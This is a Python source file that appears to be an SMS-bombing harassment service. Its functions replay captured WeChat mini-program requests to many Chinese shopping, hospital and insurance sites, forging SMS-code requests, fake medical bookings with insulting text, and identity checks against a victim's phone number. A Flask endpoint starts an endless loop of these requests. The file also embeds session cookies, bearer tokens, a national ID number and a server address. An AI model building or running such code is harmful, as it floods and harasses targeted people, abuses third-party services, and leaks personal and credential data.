def send_sms_to_wfjec(mobile):

    url = "https://api.wfjec.com/mall/user/sendRegisterSms"
    headers = {
        "Host": "api.wfjec.com",
        "Connection": "keep-alive",
        "locale": "zh_CN",
        "content-type": "application/json;charset=utf-8",
        "wuhash": "oyimt5A-pyJtv3m3psCe__6MbhIs",
        "appid": "wxf9cbb6c11bdbef46",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxf9cbb6c11bdbef46/155/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = json.dumps({"mobile": mobile})
    return requests.put(url, headers=headers, data=data)

def send_to_xiaoyusan2(mobile):

    return send_to_xiaoyusan(mobile)

def send_to_atomychina(mobile):

    url = "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code"
    cookies = {
        "acw_tc": "0b6e704217543973526363742e7228ce87cdcab16e6e1ce0c22c775c0bf455",
        "guestId": "f67b8c82-f6f4-4a2d-b857-70223098c12c",
        "guestId.sig": "cf36A-025BEBDTEeSi1ADFHYAHI",
    }
    headers = {
        "Host": "mobilev2.atomychina.com.cn",
        "Connection": "keep-alive",
        "pragma": "no-cache",
        "cache-control": "no-cache",
        "Accept": "application/json",
        "x-requested-with": "XMLHttpRequest",
        "design-site-locale": "zh-CN",
        "Accept-Language": "zh-CN",
        "X-HTTP-REQUEST-DOMAIN": "mobilev2.atomychina.com.cn",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx74d705d9fabf5b77/171/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = json.dumps({"mobile": mobile, "captcha": "1111", "token": "1111", "prefix": 86})
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send_to_chyhis(mobile):

    url = "https://lnjsb.chyhis.cn:9106/api/SMS/SendSMS"
    headers = {
        "Host": "lnjsb.chyhis.cn:9106",
        "Connection": "keep-alive",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiI0MDg4MyIsImlhdCI6IjE3NTQzOTc2NjYiLCJuYmYiOiIxNzU0Mzk3NjY2IiwiZXhwIjoiMTc2MTU5NzY2NiIsImlzcyI6IlZvbFByby5jb3JlLm93bmVyIiwiYXVkIjoidm9sLmNvcmUifQ.0WrnBuM3orSvxgT3oFo4p0o3vt3-WeVF8xm1eCuo6dY",
        "lang": "zh_CN",
        "sid": "f95c348d-c9bf-4d50-83ee-32d5111aa5e5",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx7131dd0ea8151e2b/3/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = json.dumps({
        "delKeys": None,
        "detailData": None,
        "mainData": {
            "mobile": mobile,
            "tempId": "OYI2w2",
            "type": "chengyu"
        }
    })
    return requests.post(url, headers=headers, data=data)

def send_to_hy021(mobile):

    url = "https://wx.hy021.net/api/mb1001/guahao"
    headers = {
        "Host": "wx.hy021.net",
        "Connection": "keep-alive",
        "appid": "1282a884-bde3-11ef-801e-b8cef617a30e",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx7ac8f33f519ebaa2/1/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = json.dumps({
        "data": {
            "type": 2,
            "name": "木印脑子坏了",
            "age": "35",
            "phone": mobile,
            "detail": "脑子不正常好像是脑残了",
            "gender": "男",
            "sex": 1,
            "doctor": "牛玉权"
        },
        "appid": "1282a884-bde3-11ef-801e-b8cef617a30e"
    })
    return requests.post(url, headers=headers, data=data)

def send_to_yunyiyuan(mobile):

    url = "https://i.yunyiyuan.com/consultsearch/api/realName/realNameIdentify?_sid=113431987lv62"
    cookies = {
        "xXxX_5af_r0u4e": "32dfa76727e8b91eaab49cac829fc8fb",
        "cna": "efbe901306414944a76146b6fb9aec64",
        "xat-wx_official-nbsjsby": "46d5927c3d034856ad3a7bfed2997b06",
        "route": "240cb1e73f97490cb9f0149798f79a70",
    }
    headers = {
        "Host": "i.yunyiyuan.com",
        "Connection": "keep-alive",
        "dcd": "",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "sec-ch-ua-mobile": "?1",
        "tt": "WX_OFFICIAL",
        "tc": "NBSJSBY",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://i.yunyiyuan.com",
        "X-Requested-With": "com.tencent.mm",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://i.yunyiyuan.com/consult_search_frontend/commonHome.html?authorizeCode=DB712A23506A6699A2128CCA5825EB0511F26CBCA594E7CBB676FC835778AA383C2F67E935375616A7C286AD3FD085451D929FD052183C16C5570C1A1544A8FA162EEFDE8A85F9F6832BFAEFB6C002CAF47CD77E33ADE2494F25E0B1839D4E71BA3D50FF5F15CAD86CD8E006764B6EF255A328CE4B39F12E46E200275AFF373C0B14F890BBDFA10AF93E6ECF29C7A975D073791BAB1A371C3C7C6C736E26BBB095460C92E4D9A32CC518714C8662A036360989765B4E4AFF6F6C9ED57016A6BA0B5D3EF603829D9BB2F50BEDEFCE82FBB6BCC05FF60CACF132FED5B9B98C868F21F7057EA2A3F6529495350AB68A54FDAFA0F2EECD84B73569436AC2A08538302A590C6FD48A21F1AF9D14583C21447F7607C861A61AA66481DF04B6F76EA4E437E400751F150A82748047943690CD1C832A349C0E6166A81BD6EE0CFC4BAF0035459F1F80719ED803C9C08D683C1C2386E34B4BBFFA3DEC3A86CF0BD537870B03088A8A5AF82DB4C6B38B15E11ED5CAA1BA87FB60D51C6554A4279F0D869C0FE5F900492368142CB330D5B5A513903D&terminalCode=NBSJSBY",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    data = json.dumps({
        "entryType": "MY",
        "loginPersonId": "acc_2f7b22144a5c48038e04bdb5af0f1dec",
        "personId": "acc_2f7b22144a5c48038e04bdb5af0f1dec",
        "personName": "救赎",
        "proofType": "01",
        "proofName": None,
        "proofNum": "321323198602205111",
        "maskProofNum": "321323198602205111",
        "phoneNum": None,
        "maskPhoneNum": None,
        "mobileNum": "3DE6EBFE9D7EE8DC3BF4A004B9AE8EBE",
        "maskMobileNum": "18888888888",
        "genderCode": "1",
        "genderName": "男",
        "birthday": "1986-02-20",
        "headImg": None,
        "isChild": False,
        "realNameIdentify": "0",
        "nationalityCode": None,
        "nationalityName": "",
        "guardianName": None,
        "guardianProofType": None,
        "guardianProofNum": None,
        "maskGuardianProofNum": None,
        "guardianMobileNum": None,
        "guardianBirthday": None,
        "guardianGenderCode": None,
        "guardianGenderName": None,
        "guardianNationalityCode": None,
        "guardianNationalityName": None,
        "sendMobileNum": "3DE6EBFE9D7EE8DC3BF4A004B9AE8EBE",
        "headImgType": "",
        "faceType": None,
        "carrierAbbr": "NBSJSBY",
        "scopeCode": "XK33020501EBBDECID",
        "xkOrgCode": "XK33020501EBBDECID"
    })
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send_to_ixiaochengxu(mobile):

    url = f"https://2032680.ixiaochengxu.cc/index.php?s=/addon/DuoguanZiXun/Api/toSaveReserve.html&username=%E6%95%91%E8%B5%8E&phone={mobile}&serverinfo=%E6%97%A0%E6%95%88%E9%9C%80%E8%A6%81%E8%BF%99%E4%BA%9B&datetime=2025-08-05%2021%3A04&wid=30915&is_wx=false&utoken=79d556aea8507c28bcd11ea280217960&token=gh_f4f80271a70f"
    headers = {
        "Host": "2032680.ixiaochengxu.cc",
        "Connection": "keep-alive",
        "content-type": "application/x-www-form-urlencoded",
        "client": "XCX",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxfdc41457dd795df2/1/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    return requests.get(url, headers=headers)

def send_to_blue(mobile):

    url = f"https://blue.planplus.cn/account/api/account/v1/member/sms/sendCode?mobile={mobile}"
    headers = {
        "Host": "blue.planplus.cn",
        "Connection": "keep-alive",
        "x-user-token": "TrpusLsAnnNeyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NTQ1Mjk3NzAsInRva2VuIjoie1wiZnJvbVwiOlwicGxhdGZvcm1cIixcIm9wZW5pZFwiOlwib3lLN3UwQXJMVGYybjRNR2oyc0tJYVBTX0hKd1wiLFwidW5pb25pZFwiOlwib0hlQ2NzLUFwSU05N1V2anc1a3prY1E1T3N0b1wifSJ9.o1o4upLSYY2tuiNcrJIG2r-F4DoUcw6YOana759BhzLPLmpRFXDrHKOvNPBDhijD1GKvu7vnc1MyL4BHk0iEhA",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxd4c6c416bdab4315/51/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
    return requests.post(url, headers=headers)

def send_to_qixin_first(mobile):

    url = "https://cps.qixin18.com/m/apps/cps/bxn1096837/api/mobile/sendSmsCode?md=0.8036556356856903"
    cookies = {
        "nodejs_sid": "s%3AJe330pDnPvmMafrtsgLGXZubqQg7Plv7.FB9kbFV89DrYQBJkYRb0UkaPNwzEQm5Trgd0yUlseOk",
        "fed-env": "production",
        "_qxc_token_": "eb81b40d-43f9-4bcf-8b57-bd165da4fad7",
        "hz_guest_key": "3x9a97LHUHZ4y3XPekPH_1754097046804_1_1015544_38625430",
        "_bl_uid": "j5mjkd0XtbvkC138scUCkhstU8yy",
        "acw_tc": "ac11000117543616244402076e006971cba05a01bd4bb140e4df5a1c961c19",
        "merakApiSessionId": "ebb083327198781a0976uqPJu53NwsTZ",
        "beidou_jssdk_session_id": "1754361629213-2069604-04d431e52fbfe1-30281942",
        "MERAK_DEVICE_ID": "54826bc105b8826c0935c7ef9cb76101",
        "MERAK_RECALL_ID": "98b083327198781a0b76EQOm7F0i9Itv",
        "MERAK_SESSIONID_ID": "0ab083327198781a0b77ccweQE49Inxl",
        "beidoudata2015jssdkcross": "%7B%22distinct_id%22%3A%221986854db025b8-049c104f343d668-622e2a12-430320-1986854db03495%22%2C%22first_id%22%3A%221986854db025b8-049c104f343d668-622e2a12-430320-1986854db03495%22%2C%22props%22%3A%7B%22%24search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22session_id%22%3A%22%22%2C%22%24page_visit_id%22%3A%221986854db025b8-049c104f343d668-622e2a12-430320-1986854db03495-1754361639768%22%2C%22%24device_id%22%3A%221986854db025b8-049c104f343d668-622e2a12-430320-1986854db03495%22%2C%22sdk_injection%22%3A%22INJECTED%22%2C%22login_id%22%3A%2222718695%22%7D",
        "MERAK_ENTER_PAGE_TIME": "1754361640081",
        "tfstk": "giaj-2mavjrr6dqKcV5yRFS2e7u2H_7eBCGTt5L26q3xC5FtUjP27orsyjDzuxPqkPw7Q5HwuqB06AH8QdoZDVQJ2jcMHx3ZbRG_TRYZHoPZBFF_dRiGiAktCRPT0_SP8SVmSVe1Lw7e6vnke-TxMcCtwXcGaj3j88Y-SVBFUXlLul0gHbMV3mFRNfl6WjetD0d-EftvXRHx2LhItVHTBRnJyflXHjhxDQCSsYHtWVeTw_GZeA3tWRFJZDjoaOM3G61AQSzdmdNSFFLTPb6IhSMKZfzSMm043YTtazGjcvFbRzMvjXEQPDrAMiH8D-4nXmApC4E7nPiU7KC-WcHobrFROHH_0WzjAg7W8vT7ghtiHFGSL_1WjhYCGkphigSVTmhoaBC5NhomDbcSL_1WjhmxZbrRN_tZm",
    }
    headers = {
        "Host": "cps.qixin18.com",
        "Connection": "keep-alive",
        "traceparent": "00-d5056a43b015f07aded289325bbf2233-cfe0be18fc00d80a-01",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003D57) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "Content-Type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://cps.qixin18.com",
        "X-Requested-With": "com.tencent.mm",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://cps.qixin18.com/m/apps/cps/bxn1096837/product/insure?encryptInsureNum=cm98HrGWSRoJRojI5Tg6Bg&isFormDetail=1&merak_traceId=0cb083327198781a0a49L9pe4DfciD61",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    encoded_mobile = base64_encode(mobile)
    data = json.dumps({
        "cardNumber": "NDIyNDIzMTk3NTA3MjQ2NjE1",
        "mobile": encoded_mobile,
        "cardTypeId": "1",
        "cname": "救赎",
        "productId": 105040,
        "merchantId": 1096837,
        "customerId": 37640245,
        "encryptInsureNum": "cm98HrGWSRoJRojI5Tg6Bg"
    })
    return requests.post(url, headers=headers, cookies=cookies, data=data)

def send(keys, url, payload, headers):
    try:
        if keys in resource_1.Get:
            response = requests.get(url, json=payload, headers=headers)
        else:
            response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(f"{keys} 请求成功,返回结果：{response.text}")
        else:
            print(f"{keys} 请求失败,返回结果：{response.text}")
    except requests.RequestException as e:
        print(f"{keys} 请求异常,返回结果：", e)

def polling_task(number):
    dicts = resource_1.preparingnumber(number)
    import time
    while tasks.get(number, {}).get("running", False):
        for key, items in dicts.items():
            if not tasks.get(number, {}).get("running", False):
                break
            send(key, items[0], items[1], items[2])
            time.sleep(3)
        sms_functions = [
            send_to_qixin_first,
            send_to_dxmbaoxian,
            send_to_zhongmin,
            send_to_xiaoyusan,
            send_to_mikecrm,
            send_to_szjhjt,
            send_to_qixin,
            send_to_taikang,
            send_to_szjhjt2,
            send_to_law,
            send_to_csdn,
            send_to_lynkco,
            send_to_xiaoyusan2,
            send_to_atomychina,
            send_to_chyhis,
            send_to_hy021,
            send_to_yunyiyuan,
            send_to_ixiaochengxu,
            send_to_blue
        ]


        success_count = 0
        fail_count = 0
        skip_count = 0

        for i, func in enumerate(sms_functions, 1):

            func_name = func.__name__.replace("send_to_", "")

            try:
                print(f"\n[{i}/{len(sms_functions)}] 正在发送请求到 {func_name}...")

                response = func(number)

                if response.status_code == 200:
                    print(f"状态码: 200")
                    print(f"响应内容: {response.text}")

                    if "60秒" in response.text or "请稍后再试" in response.text:
                        print("检测到频率限制，跳过此接口")
                        skip_count += 1
                    else:
                        success_count += 1
                else:
                    print(f"请求失败: 状态码 {response.status_code}")
                    print(f"响应内容: {response.text}")
                    fail_count += 1

            except Exception as e:
                print(f"请求异常: {str(e)}")
                fail_count += 1 

            if i < len(sms_functions):
                time.sleep(1)

        print("\n" + "=" * 50)
        print(f"成功: {success_count}, 失败: {fail_count}, 跳过: {skip_count}")
        print("\n完成")

@app.route("/send", methods=["GET"])
def start_send():
    number = request.args.get("number", "").strip()
    if not number.isdigit() or len(number) != 11:#http://198.23.213.23:7777/send?number=13377777281
        return jsonify({"code": 400, "msg": "手机号格式不正确"}), 400

    if number in tasks and tasks[number]["running"]:
        return jsonify({"code": 200, "msg": "该手机号任务已在运行中"})

    tasks[number] = {"running": True}
    t = threading.Thread(target=polling_task, args=(number,), daemon=True)
    t.start()
    return jsonify({"code": 200, "msg": f"手机号 {number} 轮询任务已启动"})

@app.route("/stop", methods=["GET"])
def stop_send():
    number = request.args.get("number", "").strip()
    if number in tasks:
        tasks[number]["running"] = False
        return jsonify({"code": 200, "msg": f"手机号 {number} 任务已停止"})
    return jsonify({"code": 404, "msg": "未找到该手机号的任务"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=True)
